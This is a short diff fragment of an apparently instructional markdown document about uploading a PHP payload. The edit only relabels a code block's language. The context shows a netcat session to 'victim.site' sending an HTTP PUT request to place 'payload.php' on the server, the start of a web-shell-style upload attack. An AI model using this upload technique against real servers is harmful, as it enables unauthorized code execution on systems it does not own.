@@ -18,7 +18,7 @@ for that we can use the unix utility `wc`.
 
 Command: `wc -m payload.php`
 Response: `20 payload.php`
-```php
+```http
 $ nc victim.site 80 
 PUT /payload.php HTTP/1.0
 Content-type: text/html
